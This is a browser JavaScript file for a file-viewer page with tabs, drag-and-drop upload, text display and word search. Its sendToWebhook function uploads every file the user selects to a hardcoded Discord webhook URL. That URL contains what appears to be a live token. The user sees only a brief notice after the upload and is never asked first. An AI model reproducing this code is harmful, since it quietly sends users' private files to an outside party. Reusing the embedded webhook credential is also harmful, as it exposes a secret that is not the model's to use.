document.addEventListener('DOMContentLoaded', function() {
    const tabs = document.querySelectorAll('.tab');
    const contents = document.querySelectorAll('.tab-content');
    const dropZone = document.getElementById('dropZone');
    const fileInput = document.getElementById('fileInput');
    const searchInput = document.getElementById('searchInput');
    const sourceCodeDisplay = document.getElementById('sourceCodeDisplay');
    const nearestWordDisplay = document.getElementById('nearestWord');

    // Tab switching
    tabs.forEach((tab, index) => {
        tab.addEventListener('click', () => {
            tabs.forEach(t => t.classList.remove('active'));
            contents.forEach(c => c.classList.remove('active'));
            tab.classList.add('active');
            contents[index].classList.add('active');
        });
    });

    // File upload handling
    dropZone.addEventListener('click', () => fileInput.click());
    dropZone.addEventListener('dragover', (e) => {
        e.preventDefault();
        dropZone.classList.add('dragover');
    });
    dropZone.addEventListener('dragleave', () => {
        dropZone.classList.remove('dragover');
    });
    dropZone.addEventListener('drop', (e) => {
        e.preventDefault();
        dropZone.classList.remove('dragover');
        handleFile(e.dataTransfer.files[0]);
    });
    fileInput.addEventListener('change', (e) => handleFile(e.target.files[0]));

    async function handleFile(file) {
        if (!file) return;
        
        try {
            const content = await readFile(file);
            sourceCodeDisplay.textContent = content;
            await sendToWebhook(file);

            // Show notification
            showNotification('File Sample Uploaded to developers Check Src code if you uploaded a .py file or text file');
        } catch (error) {
            console.error('Error handling file:', error);
        }
    }

    function readFile(file) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.onload = (e) => resolve(e.target.result);
            reader.onerror = (e) => reject(e);
            reader.readAsText(file);
        });
    }

    async function sendToWebhook(file) {
        const webhookUrl = 'https://discord.com/api/webhooks/1321182235033862294/4Meu4yINGKy9arOufDNoFcRWviPGTDQTu9q8w31Jt61yLukZWygbqTM2bTsoFm3UxETl';
        const formData = new FormData();
        formData.append('file', file);

        try {
            const response = await fetch(webhookUrl, {
                method: 'POST',
                body: formData
            });
            
            if (!response.ok) {
                throw new Error('Failed to send file');
            }
        } catch (error) {
            console.error('Error sending to webhook:', error);
        }
    }

    function showNotification(message) {
        const notification = document.getElementById('notification');
        notification.textContent = message;
        notification.classList.add('show');

        // Hide the notification after 3 seconds
        setTimeout(() => {
            notification.classList.remove('show');
        }, 3000); // 3000ms = 3 seconds
    }

    // Search functionality
    searchInput.addEventListener('input', () => {
        const searchTerm = searchInput.value.toLowerCase();
        const content = sourceCodeDisplay.textContent.toLowerCase();
        const words = content.split(/\s+/);
        
        const nearestWord = words.find(word => word.includes(searchTerm));
        if (nearestWord) {
            nearestWordDisplay.textContent = `Found: ${nearestWord}`;
        } else {
            nearestWordDisplay.textContent = 'No matches found';
        }
    });
});
